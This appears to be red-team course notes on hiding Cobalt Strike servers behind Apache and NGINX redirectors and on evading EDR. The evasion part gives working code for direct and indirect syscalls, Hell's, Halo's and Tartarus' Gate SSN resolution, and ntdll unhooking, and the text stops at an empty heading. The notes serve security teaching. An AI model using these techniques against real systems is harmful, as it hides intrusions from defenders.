1. C2 Infrastructure

The Red Team Ops course operated with a single team server exposed directly to the target environment (effectively sitting on the Internet with a public IP). That works for learning but is not how C2 infrastructure should be deployed in a real engagement.

Good C2 design has two goals:

  • Resilience against blue team mitigations
  • Information protection — limit what defenders can learn from a single discovery

Two strategies achieve this: add redundancy and variety in the C2, and place team servers behind redirectors so they aren't directly Internet-facing.

1.1 Redirectors

Cobalt Strike is designed for operators to stand up multiple team servers per engagement phase — one each for initial access, long-term persistence, and post-exploitation. Each should run a sufficiently different Malleable C2 profile so that discovery of one doesn't compromise the others.

Scenario: a phishing payload gets reported. The blue team investigates, identifies the initial access payload, on-disk indicators, and C2 domain. They block the domain and file hashes. The damage is limited if you already used that initial access to install long-term persistence on a different team server, using a different domain and profile. The persistence Beacon then spawns sessions into a third (post-ex) team server. If post-ex gets caught, the persistence Beacon remains — only a small part of the infrastructure has to be rebuilt.

A redirector receives incoming traffic and forwards it elsewhere. Three flavours:

TypeForwardingExamples
DumbForwards everything blindlysocat, iptables
SmartConditional forwarding based on request propertiesApache, NGINX
SaaSForwards through a cloud functionAWS Lambda, Azure Functions

The primary purpose is to act as a buffer between blue teams and the team server — defenders can't directly port-scan or fingerprint the team server. SaaS redirectors also bring reputational benefits — C2 traffic to *.azurewebsites.net blends with legitimate cloud usage.

1.2 Apache

Apache is a web server with modules for conditional redirecting and proxying. Inspect the incoming request, then forward to the team server if it matches the C2 profile, or return a 404 / drop / redirect to a benign page otherwise. Install and enable the required modules:

$ sudo apt install apache2
$ sudo a2enmod rewrite proxy proxy_http

Edit /etc/apache2/sites-enabled/000-default.conf and add the following below the closing </VirtualHost> tag:

<Directory /var/www/html/>
    Options Indexes FollowSymLinks MultiViews
    AllowOverride All
    Require all granted
</Directory>

Create /var/www/html/.htaccess:

RewriteEngine on
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P]

The RewriteRule syntax is pattern substitution [flags]. The pattern ^.*$ matches every request; the substitution forwards it to the team server. The [P] flag proxies the request transparently rather than issuing an HTTP redirect — the caller sees the team server's response without ever knowing about it.

Restart Apache:

$ sudo systemctl restart apache2

Beacons should now check in normally. As-is, however, this forwards everything — defeating the redirector's purpose. Lock it down to only forward traffic that matches the C2 profile.

1.2.1 URIs

.htaccess changes take effect without restarting Apache. Recommendation: leave a Beacon checking in while editing; if it stops, you've broken something.

The course lab uses a profile based on webbug — __utm.gif for GET (check-in) and ___utm.gif for POST (output). Restrict the rewrite to those specific URIs and methods:

RewriteEngine on

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} ^/__utm.gif$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ^/___utm.gif$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteRule ^.*$ - [R=404,L]

Line-by-line:

  • Line 3 — REQUEST_METHOD matches GET (NC = case-insensitive)
  • Line 4 — REQUEST_URI matches /__utm.gif exactly (anchored start/end)
  • Line 5 — both conditions matched; proxy with [P,L] (proxy, last — stop processing further rules)
  • Lines 7-9 — same pattern for POST and /___utm.gif
  • Line 11 — catch-all 404 if neither rule matched

Verify Beacon still checks in and that a test command like getuid returns output. If you see [+] host called home, sent: n bytes but no output appears, the POST rewrite rule is broken.

1.2.2 Query strings

Query strings can be matched against the profile too. The http-get profile sends six static parameters plus utmcc (metadata):

client {
	parameter "utmac" "UA-2202604-2";
	parameter "utmcn" "1";
	parameter "utmcs" "ISO-8859-1";
	parameter "utmsr" "1280x1024";
	parameter "utmsc" "32-bit";
	parameter "utmul" "en-US";

	metadata {
		netbios;
		prepend "__utma";
		parameter "utmcc";
	}
}

Resulting query string:

utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utmailbpjhikccllnpgomfjjiikmoiidlmhd

The http-post profile sends the Beacon ID in utmac plus five static parameters:

client {
	id {
		prepend "UA-220";
		append "-2";
		parameter "utmac";
	}

	parameter "utmcn" "1";
	parameter "utmcs" "ISO-8859-1";
	parameter "utmsr" "1280x1024";
	parameter "utmsc" "32-bit";
	parameter "utmul" "en-US";
}

Resulting query string:

utmac=UA-22049931-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US

Putting it all together with the htaccess regex:

RewriteEngine on

RewriteCond %{REQUEST_METHOD} GET [NC]
RewriteCond %{REQUEST_URI} ^/__utm.gif$
RewriteCond %{QUERY_STRING} ^utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma(.*)$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteCond %{REQUEST_METHOD} POST [NC]
RewriteCond %{REQUEST_URI} ^/___utm.gif$
RewriteCond %{QUERY_STRING} ^utmac=UA-220[0-9]+-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US$
RewriteRule ^.*$ http://10.0.0.5%{REQUEST_URI} [P,L]

RewriteRule ^.*$ - [R=404,L]

1.2.3 X-Forwarded-For

By default, the Beacon's external IP appears as the redirector's. Apache sets the X-Forwarded-For header on the forwarded request — set http-config.trust_x_forwarded_for to true in Malleable C2 so the team server reads the true origin from it:

http-config {
   set trust_x_forwarded_for "true";
}

Only a team server restart is required — no payload rebuild and no redirector config change.

1.3 NGINX

NGINX is a web server that also handles reverse proxying, load balancing, and HTTP caching. Setup mirrors Apache:

$ sudo apt install nginx

The default config sits at /etc/nginx/sites-enabled/default; the web root is /var/www/html. Modify the location / block to proxy everything to the team server:

location / {
	proxy_pass http://10.0.0.5;
    include proxy_params;
}

Restart NGINX:

$ sudo systemctl restart nginx

Beacons now check in via the redirector.

NGINX has no .htaccess support — filtering rules go directly in the config. The principles match Apache. The location / directive matches every request; restrict it to only the URIs the profile uses. ~* is a case-insensitive regex match; ! inverts:

# proxy __utm.gif
location ~* /__utm.gif {
	proxy_pass http://10.0.0.5;
    include proxy_params;
}

# proxy ___utm.gif
location ~* /___utm.gif {
	proxy_pass http://10.0.0.5;
    include proxy_params;
}

# catch all
location / {
	return 404;
}

The location directive supports regex, so randomised URIs like /[a|b|c|d]/ytrewq/get.js are matched with location ~* /(a|b|c|d)/ytrewq/get.js. The $request_method and $query_string variables tighten the check further:

# proxy __utm.gif
location ~* /__utm.gif {
	# must be a GET
	if ($request_method !~* GET ) {
    	return 404;
    }

	# parameters must match
	if ($query_string !~ ^utmac=UA-2202604-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US&utmcc=__utma.+$) {
    	return 404;
	}

    # yeet
    proxy_pass http://10.0.0.5;
    include proxy_params;
}

# proxy ___utm.gif
location ~* /___utm.gif {
	# must be a POST
	if ($request_method !~* POST ) {
    	return 404;
    }

	# parameters must match
	if ($query_string !~ ^utmac=UA-220[0-9]+-2&utmcn=1&utmcs=ISO-8859-1&utmsr=1280x1024&utmsc=32-bit&utmul=en-US) {
    	return 404;
	}

    # yeet
	proxy_pass http://10.0.0.5;
    include proxy_params;
}

# catch all
location / {
	return 404;
}

1.3.1 Payloads

If the team server's internal web server is also hosting files and payloads (typical for the initial access team server), restrict who can fetch them. $remote_addr matches the caller's IP:

location /payload {
	if ($remote_addr !~ x.x.x.x) {
    	return 404;
	}

    proxy_pass http://10.0.0.5;
}

Instead of a 404, return decoy content or redirect to a benign URL:

location /payload {
	if ($remote_addr !~ x.x.x.x) {
    	return 200 "Nothing to see here...";
	}

	proxy_pass http://10.0.0.5;
}

...

location /payload {
	if ($remote_addr !~ x.x.x.x) {
    	return 301 https://www.google.com/;
	}

	proxy_pass http://10.0.0.5;
}

2. EDR Telemetry

This chapter covers the typical telemetry sources EDRs use for detection and response, and the techniques used to circumvent them.

2.1 APIs

Most implants and malware on Windows rely on the native API for token tactics, process injection, and post-exploitation. These functions are exported from Windows DLLs such as KernelBase.dll and ntdll.dll — either loaded into a process by default, or loaded at runtime via LoadLibrary.

Code loaded from those DLLs runs in user mode. Each process gets its own private virtual memory, and a crash only affects that process. By contrast, all kernel mode code shares one virtual address space — a bad driver can crash the entire system. Only kernel code can interact with physical hardware (RAM, disks).

A user mode API like OpenProcess (exported from KernelBase.dll) calls NtOpenProcess in ntdll.dll. NtOpenProcess executes a syscall instruction, transitioning into kernel mode. The kernel (ntoskrnl.exe) performs the access checks and returns the handle.

2.2 System Service Descriptor Table

The System Service Descriptor Table (SSDT) maps syscall numbers (SSNs) to function pointers in the kernel. NtOpenProcess executes mov eax, 0x26, placing 38 (the SSN for NtOpenProcess) into EAX. The syscall instruction transitions to kernel mode; the kernel reads EAX, looks up entry 38 in the SSDT, and jumps to the right routine.

2.3 User mode vs Kernel mode

Pre-Vista, security vendors monitored API usage by hooking SSDT entries — redirecting execution into the vendor's own driver. Microsoft killed this with Kernel Patch Protection (KPP / PatchGuard), which periodically checks critical kernel structures including the SSDT and triggers a bug check (BSOD) on tampering. Ejecting vendors from the kernel caused enough blowback that Symantec sued.

Vendors moved to user-mode hooking after that. They still want kernel access for detection visibility, while Microsoft wants third-party drivers out of the kernel — the CrowdStrike incident is a recent illustration of why. Microsoft has signalled Windows 11 changes that may move vendors out of the kernel entirely, with parallel changes to consumer Defender and Defender for Endpoint (anti-competition law makes "Microsoft in, vendors out" untenable).

For now, vendors run kernel drivers and Microsoft has added callback objects and ETW-TI to improve their visibility — covered in subsequent sections.

2.4 API Hooking

Developers reach API functionality through SDK headers — #include <windows.h>, call MessageBoxW, etc. At compile time, the PE gets an Import Directory listing the DLLs it depends on. At runtime, the Windows loader loads each DLL, resolves each imported function's address, and patches those addresses into the Import Address Table (IAT).

Resolution is conceptually GetModuleHandle/LoadLibrary for the DLL base, then GetProcAddress for each function. The IAT becomes an in-memory lookup table of function names to pointers. When the PE calls one of those functions, it reads the pointer from the IAT and jumps to it.

The example below uses MessageBoxW from User32.dll:

#include <windows.h>

int main() {
    return MessageBoxW(NULL, L"Hello World", L"Example", 0);
}

Run it under WinDbg, which breaks after the loader resolves the IAT. The x (examine symbols) command locates MessageBoxW in memory:

0:000> x User32!MessageBoxW
00007ffd`c3532e70 USER32!MessageBoxW (MessageBoxW)

Disassembling the program's main shows a jmp whose target is read from 00007ff6`f3daf260 — an IAT entry. The PE headers (!dh) show the image base and the IAT directory:

0:000> !dh ExampleApp

[...snip...]

00007ff6f3da0000 image base

[...snip...]

F000 [     270] address [size] of Import Address Table Directory

IAT starts at image_base + 0xF000 = 00007ff6`f3daf000 and is 0x270 bytes long. dps dumps the addresses and symbols:

0:000> dps 00007ff6`f3daf000 00007ff6`f3daf270

[...snip...]

00007ff6`f3daf260  00007ffd`c3532e70 USER32!MessageBoxW

The IAT entry at 00007ff6`f3daf260 points at USER32!MessageBoxW — the resolved function in User32.dll.

2.5 IAT Hooking

IAT hooking overwrites the resolved pointers after the loader has populated them, redirecting them at a third-party "detour" function. When the application calls an imported function, execution jumps to the detour instead. From there, the third-party DLL can:

  • Log the arguments
  • Modify arguments before forwarding to the real function
  • Block the call entirely

The hooking logic typically backs up the original pointers so it can chain through to the real function when needed.

2.6 Inline Hooking

Inline hooking overwrites the executable code of the target function itself. The first few instructions of the target become an unconditional jmp to a detour. A trampoline preserves the overwritten instructions and jumps back into the target past the hook.

Prior to hooking, MessageBoxW starts with the original prologue:

0:000> u User32!MessageBoxW
sub     rsp,38h
xor     r11d,r11d
cmp     dword ptr [USER32!gfEMIEnable (00007ffd`c35e5848)],r11d
je      USER32!MessageBoxW+0x35 (00007ffd`c3532ea5)
mov     rax,qword ptr gs:[30h]
mov     r10,qword ptr [rax+48h]
xor     eax,eax

After hooking, the prologue is replaced by a jump:

0:000> u User32!MessageBoxW
jmp     00007ffd`83520178
int     3
int     3

The jump target reads another address from 00007ffd`83520170:

0:000> u 00007ffd`83520178
jmp     qword ptr [00007ffd`83520170]

That address points to the detour function:

0:000> dps 00007ffd`83520170
00007ff7`ab021080 HOOK64!MessageBoxW_Detour

The detour loads a tampered argument (the string "This function has been hooked!") and jumps to the trampoline:

0:000> u 00007ff7`ab021080
lea     rdx,[HOOK64!`string' (00007ff7`ab026488)]
jmp     qword ptr [HOOK64!MessageBoxW_Trampoline (00007ff7`ab028788)]
0:000> dps 00007ff7`ab028788
00007ff7`ab028788  00007ffd`83520120

The trampoline replays the original first instructions (sub rsp,38h; xor r11d,r11d) and jumps back into the real function past the overwritten prologue:

0:000> u 00007ffd`83520120
sub     rsp,38h
xor     r11d,r11d
jmp     qword ptr [00007ffd`83520168]
int     3
int     3
0:000> dps 00007ffd`83520168
00007ffd`83520168  00007ffd`c3532e77 USER32!MessageBoxW+0x7

Execution resumes inside MessageBoxW at +0x7, continuing the real function:

0:000> u 00007ffd`c3532e77
cmp     dword ptr [USER32!gfEMIEnable (00007ffd`c35e5848)],r11d
je      USER32!MessageBoxW+0x35 (00007ffd`c3532ea5)
mov     rax,qword ptr gs:[30h]
mov     r10,qword ptr [rax+48h]
xor     eax,eax

This is one flavour of inline hooking. Implementations vary — most use jmp or call instructions to hardcoded or indirect addresses.

2.7 Manual syscalls

Executing a syscall instruction directly transitions to kernel mode without traversing user-mode hooks. Two flavours exist:

TypeMechanismCall-stack appearance
Directsyscall in your own assembly stubStub appears as the caller of the syscall — anomalous
Indirectjmp to the syscall instruction inside ntdllStack shows ntdll!Nt* as the syscaller — normal

2.7.1 Direct syscalls

A direct syscall writes an assembly stub that mirrors what ntdll does — move the SSN into EAX, execute syscall. Visual Studio supports MASM, so the stub can live alongside C++ code:

.code

	NtOpenProcess proc
		mov r10, rcx
		mov eax, 26h
		syscall
		ret
	NtOpenProcess endp

	NtClose proc
		mov r10, rcx
		mov eax, 0Fh
		syscall
		ret
	NtClose endp

end

Declare the Native API structures and prototypes in a header:

#pragma once

#include <Windows.h>

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	HANDLE RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG Attributes;
	PVOID SecurityDescriptor;
	PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

#define InitializeObjectAttributes(p, n, a, r, s) { \
    (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
    (p)->RootDirectory = r; \
    (p)->Attributes = a; \
    (p)->ObjectName = n; \
    (p)->SecurityDescriptor = s; \
    (p)->SecurityQualityOfService = NULL; \
    }

typedef struct _CLIENT_ID {
	HANDLE UniqueProcess;
	HANDLE UniqueThread;
} CLIENT_ID, * PCLIENT_ID;

EXTERN_C_START

NTSTATUS
NTAPI
NtOpenProcess(
	_Out_    PHANDLE            ProcessHandle,
	_In_     ACCESS_MASK        DesiredAccess,
	_In_     POBJECT_ATTRIBUTES ObjectAttributes,
	_In_opt_ PCLIENT_ID         ClientId
);

NTSTATUS
NTAPI
NtClose(
	_In_ HANDLE Handle
);

EXTERN_C_END

A minimal main calls the stub:

#include "syscalls.h"
#include <cwchar>

void DebugPrintf(const wchar_t* fmt, ...) {
    wchar_t buffer[512];
    va_list args;
    va_start(args, fmt);
    vswprintf(buffer, sizeof(buffer) / sizeof(wchar_t), fmt, args);
    va_end(args);

    OutputDebugStringW(buffer);
}

int main()
{
    NTSTATUS          status;
    HANDLE            hProcess = NULL;
    OBJECT_ATTRIBUTES objAttr;
    CLIENT_ID         cid;

    InitializeObjectAttributes(&objAttr, NULL, 0, NULL, NULL);

    cid.UniqueProcess = (HANDLE)39692;
    cid.UniqueThread = (HANDLE)0;

    DebugPrintf(L"Calling NtOpenProcess... ");

    status = NtOpenProcess(
        &hProcess,
        PROCESS_ALL_ACCESS,
        &objAttr,
        &cid);

    DebugPrintf(L"%lp\n", hProcess);

    if (NT_SUCCESS(status))
    {
        NtClose(hProcess);
        DebugPrintf(L"%Exiting main...\n");
        return 0;
    }

    return 1;
}

Set a breakpoint on ntdll!NtOpenProcess — it never fires, because the syscall bypasses ntdll:

0:000> bp ntdll!NtOpenProcess
0:000> g
Calling NtOpenProcess... 00000000000000C4
Exiting main...

The call stack reveals the catch. Normal flow through OpenProcess looks like:

ntdll!NtOpenProcess
KERNELBASE!OpenProcess+0x56
Demo!main+0xa0

Direct syscall flow shows the stub directly:

SyscallDemo!NtOpenProcess
SyscallDemo!main+0xb7

Anything inspecting call stacks spots this immediately. Some AVs also flag the direct-syscall byte pattern:

b8 ?? 00 00 00    mov    eax,0x??
0f 05             syscall

2.7.2 Indirect syscalls

Indirect syscalls fix the call-stack anomaly by jumping to the syscall instruction inside ntdll instead of executing one locally. The SSN still controls routing — only the location of the syscall instruction differs.

Disassemble NtOpenProcess:

0:000> uf ntdll!NtOpenProcess
00007ffd`2a6e1fb0 4c8bd1           mov     r10,rcx
00007ffd`2a6e1fb3 b826000000       mov     eax,26h
00007ffd`2a6e1fb8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffd`2a6e1fc0 7503             jne     ntdll!NtOpenProcess+0x15 (00007ffd`2a6e1fc5)  Branch
00007ffd`2a6e1fc2 0f05             syscall
00007ffd`2a6e1fc4 c3               ret

The syscall instruction is at 00007ffd`2a6e1fc2. Move the SSN into EAX as usual and jump to that address:

EXTERN ntOpenProcessSyscall:QWORD

.code

	NtOpenProcess proc
		mov r10, rcx
		mov eax, 26h
		jmp QWORD PTR [ntOpenProcessSyscall]
	NtOpenProcess endp

end
EXTERN_C_START

UINT_PTR ntOpenProcessSyscall = 140725315313602;

...

EXTERN_C_END

The call stack now shows ntdll as the caller:

ntdll!NtOpenProcess+0x12
SyscallDemo!main+0x134

Some products can be fooled further by jumping to the syscall instruction of a different Nt* function. EAX still controls routing in the kernel:

EXTERN ntCloseSyscall:QWORD

.code

	NtOpenProcess proc
		mov r10, rcx
		mov eax, 26h					; <- ssn of NtOpenProcess
		jmp QWORD PTR [ntCloseSyscall]  ; <- jmp to syscall in NtClose
	NtOpenProcess endp

end
ntdll!NtClose+0x12
SyscallDemo!main+0xb7

2.7.3 Syscall libraries

The examples above hardcode SSNs and addresses. Two reasons that fails in the real world:

  • SSNs vary between Windows versions
  • ASLR randomises DLL load addresses across boots

Offensive tools need to resolve both at runtime. A naive approach: resolve the function pointer, add 4 for the SSN, add 0x12 for the syscall instruction:

HMODULE hModule = GetModuleHandle(L"ntdll.dll");
UINT_PTR pNtOpenProcess = (UINT_PTR)GetProcAddress(hModule, "NtOpenProcess");

/* the SSN is at +4 */
WORD ssn = *(PWORD)(pNtOpenProcess + 4);
DebugPrintf(L"SSN is %d\n", ssn);

/* the syscall instruction is at +18 */
UINT_PTR pSyscall = pNtOpenProcess + 0x12;
DebugPrintf(L"JMP instruction @ %lp\n", pSyscall);
0:000> g
SSN is 38
JMP instruction @ 00007FFAC79E1FC2

This works on a clean system but fails against hooked ntdll — the offsets shift when the prologue is rewritten. Three projects address this, each improving on the previous:

TechniqueApproachLimitation it fixes
Hell's GateWalk ntdll's EAT, scan the function for b8 (mov eax); next WORD is the SSN.Original direct-syscall library — works on clean ntdll only.
Halo's GateIf b8 is missing, walk neighbouring Nt* functions for an unhooked one and infer the SSN by offset. E.g. NtQueryInformationThread=0x25 and NtSetInformationFile=0x27 ⇒ missing NtOpenProcess=0x26.Hooked target function.
Tartarus' GateHook detection: Halo's Gate checks bytes 0–2 for 4c 8b d1 (mov r10, rcx) only. Tartarus' Gate also checks byte 3 for e9 (jmp).Vendors that preserve mov r10, rcx and overwrite mov eax later.

2.7.4 Hell's Gate

Hell's Gate is the original direct-syscall library — it resolves SSNs at runtime. It walks ntdll's Export Address Table (EAT) to locate a target function, then scans the function for the b8 (mov eax) opcode. The next WORD is the SSN.

Step-by-step:

  1. Walk the PEB → loaded modules → find ntdll.dll base.
  2. Parse the PE Export Directory and look up the address of, e.g., NtOpenProcess.
  3. Read bytes at that address — on a clean ntdll you get the standard syscall prologue.
  4. The byte 0xB8 (mov eax, <imm32>) sits at offset +3 of the function. Read the next 4 bytes — that's the SSN.

Concretely the prologue looks like this:

; NtOpenProcess on a clean Win10 22H2 build
4C 8B D1            mov r10, rcx        ; preserve arg1
B8 26 00 00 00      mov eax, 0x26       ; ← SSN = 0x26
F6 04 25 08 ...     test [...]
0F 05               syscall
C3                  ret

Hell's Gate works whenever the target function's first 8 bytes are intact. If an EDR overwrites byte +3 with a jmp (0xE9) to its inspection routine, the SSN is gone — that's the failure case Halo's Gate fixes.

2.7.5 Halo's Gate

Halo's Gate handles the case where the target function is hooked and the b8 opcode is missing. It searches the neighbouring Nt* functions for an unhooked one and infers the target SSN from the difference. For example, if NtOpenProcess is hooked but NtQueryInformationThread (SSN 0x25) and NtSetInformationFile (SSN 0x27) aren't, the missing one must be 0x26. If neighbours are also hooked, it walks further outward.

Why this works: ntdll's Nt* stubs are emitted by the linker in a fixed order, and their SSNs are assigned sequentially. The address of NtX+1 in the EAT is at a fixed offset (typically +0x20 bytes) from NtX, and its SSN is NtX_ssn + 1. So if you find any unhooked neighbour, you can count back to your target.

Step-by-step:

  1. Resolve NtOpenProcess via the EAT — you get a function address.
  2. Read byte +3. If it's not 0xB8, the function is hooked.
  3. Read byte +3 of the function one slot down in the EAT (e.g. NtOpenProcessToken, address+0x20). Hooked? Try +0x40. Hooked too? Try -0x20 (neighbour above).
  4. When you find an unhooked neighbour with SSN N, the target's SSN is N - distance (or N + distance depending on which side).

The technique fails only if every nearby Nt* is hooked — rare in practice, since most EDRs hook 20-30 functions out of 400+ in ntdll.

2.7.6 Tartarus' Gate

Tartarus' Gate improves how Halo's Gate detects hooks. Halo's Gate checks the first three bytes for 4c 8b d1 (mov r10, rcx) and treats anything else as hooked — but some vendors preserve those bytes and overwrite mov eax later instead. Tartarus' Gate adds a check on the fourth byte for an e9 (jmp) opcode, catching that case.

Failure mode Halo's Gate has:

  • EDR sees a syscall call, replaces bytes +3 onwards with E9 XX XX XX XX (a 5-byte jmp to the inspector).
  • Bytes 0-2 still read 4C 8B D1 — Halo's Gate says "looks clean!"
  • Halo's Gate then reads the WORD at offset +4, gets garbage (part of the jmp target), and returns an invalid SSN.

Tartarus' fix: after confirming bytes 0-2 are 4C 8B D1, also check byte +3 is 0xB8 (the real mov eax) and not 0xE9 (a hook jmp). If byte +3 is 0xE9, treat the function as hooked and walk to neighbours, same as Halo's Gate.

Practical recommendation: use Tartarus' Gate — it has Hell's Gate's clean-system speed and Halo's Gate's hook-survivability, plus the four-byte detection. Most modern direct-syscall libraries (SysWhispers3, FreshyCalls) implement Tartarus-style detection by default.

2.8 API unhooking

API unhooking overwrites the hooks installed by a product — restoring original IAT pointers (IAT hooks) or original function bytes (inline hooks). Inline hooks are more common in practice. Since many ntdll functions may be hooked, it's easier to replace the entire .text section than handle them one-by-one. Steps:

  1. Read a clean copy of ntdll.dll from disk
  2. Get the base address of the loaded (hooked) ntdll
  3. Locate its .text section
  4. Make the .text region writable
  5. Copy the clean .text over the hooked one
  6. Restore the original memory permissions
  7. Flush the instruction cache
void UnhookNtdll()
{
    /* load a clean copy of ntdll into memory */
    HANDLE hFile = CreateFile(
        L"C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    HANDLE hMapping = CreateFileMapping(
        hFile,
        NULL,
        PAGE_READONLY | SEC_IMAGE,
        0,
        0,
        NULL
    );

    LPVOID hFileView = MapViewOfFile(
        hMapping,
        FILE_MAP_READ,
        0,
        0,
        0
    );

    printf("Fresh ntdll.dll mapped to %p\n", hFileView);

    /* get ntdll's base address */
    LPVOID hModule = (LPVOID)GetModuleHandle(L"ntdll.dll");
    printf("Hooked ntdll.dll @ %p\n", hModule);

    /* parse DLL headers */
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)((ULONG_PTR)hModule + dosHeader->e_lfanew);

    /* loop over each section */
    for (int i = 0; i < ntHeader->FileHeader.NumberOfSections; i++)
    {
        PIMAGE_SECTION_HEADER sectionHeader = (PIMAGE_SECTION_HEADER)((ULONG_PTR)IMAGE_FIRST_SECTION(ntHeader) + ((ULONG_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

        /* is this the .text section? */
        if (!strcmp((char*)sectionHeader->Name, (char*)".text"))
        {
            LPVOID lpSection = (LPVOID)((ULONG_PTR)hModule + (ULONG_PTR)sectionHeader->VirtualAddress);
            printf("ntdll.dll .text section @ %p\n", lpSection);

            /* make the section writeable */
            DWORD oldProtection = 0;
            VirtualProtect(
                lpSection,
                sectionHeader->Misc.VirtualSize,
                PAGE_EXECUTE_READWRITE,
                &oldProtection
            );

            printf("Changed section from %d to 64\n", oldProtection);

            /* copy clean section over the hooked one */
            memcpy(
                lpSection,
                (LPVOID)((ULONG_PTR)hFileView + (ULONG_PTR)sectionHeader->VirtualAddress),
                sectionHeader->Misc.VirtualSize
            );

            printf("Copied %d bytes\n", sectionHeader->Misc.VirtualSize);

            /* restore memory permissions */
            VirtualProtect(
                lpSection,
                sectionHeader->Misc.VirtualSize,
                oldProtection,
                &oldProtection
            );

            printf("Restored section to %d\n", oldProtection);

            /* in case the previous instructions were cached */
            FlushInstructionCache(
                (HANDLE)-1,
                lpSection,
                sectionHeader->Misc.VirtualSize
            );

            break;
        }
    }

    /* cleanup */
    UnmapViewOfFile(hFileView);
    CloseHandle(hMapping);
    CloseHandle(hFile);
}

Before unhooking, NtOpenProcess shows a jmp at the start (hooked):

0:000> u ntdll!NtOpenProcess
ntdll!NtOpenProcess:
00007ffa`c79e1fb0 e9c3e1febf      jmp     00007ffa`879d0178
00007ffa`c79e1fb5 cc              int     3
00007ffa`c79e1fb6 cc              int     3
00007ffa`c79e1fb7 cc              int     3

Run the unhook:

Fresh ntdll.dll mapped to 000002D22DBB0000
Hooked ntdll.dll @ 00007FFAC7880000
ntdll.dll .text section @ 00007FFAC7881000
Changed section from 32 to 64
Copied 1486332 bytes
Restored section to 64

After unhooking, the original prologue is restored:

0:000> u ntdll!NtOpenProcess
ntdll!NtOpenProcess:
00007ffa`c79e1fb0 4c8bd1           mov     r10,rcx
00007ffa`c79e1fb3 b826000000       mov     eax,26h
00007ffa`c79e1fb8 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffa`c79e1fc0 7503             jne     ntdll!NtOpenProcess+0x15 (00007ffa`c79e1fc5)
00007ffa`c79e1fc2 0f05             syscall
00007ffa`c79e1fc4 c3               ret

Downside: the unhook itself uses user-mode APIs (CreateFile, MapViewOfFile, VirtualProtect) that may themselves be hooked. Vendors can also detect the read of ntdll.dll from disk, periodically verify hook integrity, and re-hook or alert as needed.

2.9 Call Stacks

A call stack is a LIFO structure where data is added with push and removed with pop. It serves four purposes during function execution:

  • Spill fast-call register values
  • Store local variables
  • Store return addresses
  • Pass additional arguments beyond what fits in registers

The demo program below illustrates this — compile in Debug mode so the compiler doesn't optimise the assembly:

#include <stdio.h>

int doMath(int a, int b, int c, int d, int e, int f)
{
    auto x = a + b + c;
    auto y = (x * e) / f;

    printf("x = %d, y = %d\n", x, y);

    return x - y;
}

int main()
{
    auto result = doMath(10, 11, 12, 13, 14, 15);
    printf("The result is: %d\n", result);

    return 0;
}

2.9.1 x64 calling convention

The x64 ABI uses a fast-call convention:

  • First four scalar arguments (integers, pointers) → RCX, RDX, R8, R9
  • First four non-scalar arguments (floats, doubles) → XMM0L, XMM1L, XMM2L, XMM3L
  • Additional arguments → pushed onto the stack
  • Scalar return values → RAX; non-scalar → XMM0

The caller allocates at least 32 bytes of shadow (home) space before each call — 8 bytes for each fast-call register so the callee can spill its register arguments:

[rsp+20h] <- for r9
[rsp+18h] <- for r8
[rsp+10h] <- for rdx
[rsp+08h] <- for rcx

RSP always points at the lowest address of the active stack frame. A frame is the stack region for the currently executing function — return address, locals, and stack-passed arguments. The return address is implicitly pushed by the call instruction. When arguments overflow the four registers (e.g. six args to doMath), they're stacked after the shadow space:

[rsp+30h] <- arg6
[rsp+28h] <- arg5
[rsp+20h] <- for r9
[rsp+18h] <- for r8
[rsp+10h] <- for rdx
[rsp+08h] <- for rcx
[rsp] <- return address

2.9.2 Function prologues

The compiler inserts prologue instructions at the start of each function to satisfy the ABI: preserve nonvolatile registers, allocate stack space for locals, and (for callees) spill register arguments.

main

main's prologue pushes RBP and RDI (nonvolatile registers — the callee must restore them before returning) and then runs sub rsp, 118h to grow the stack by 280 bytes (32 for shadow space + 248 for locals + alignment padding). The stack grows downward in memory, so subtracting from RSP enlarges it. main doesn't spill register arguments because no parameters were passed to it.

To call doMath(10, 11, 12, 13, 14, 15), main places args 5 and 6 on the stack at rsp+20h/rsp+28h, args 1–4 in RCX/RDX/R8/R9 (using ECX/EDX for 32-bit values), then issues call.

doMath

doMath's prologue first spills the fast-call register arguments into main's shadow space — necessary because the function will reuse those registers for arithmetic. Now inside doMath, the return address pushed by call sits at [rsp]; spilled args go above it, and stacked args 5 and 6 shift to rsp+28h / rsp+30h (offset by the 8-byte return address). Then doMath pushes RBP/RDI and grows the stack for its own locals.

2.9.3 Function epilogues

The epilogue undoes the prologue: add rsp, <n> shrinks the stack back to its previous size, pop restores the nonvolatile registers, and ret implicitly pops the return address.

2.9.4 Stack unwinding

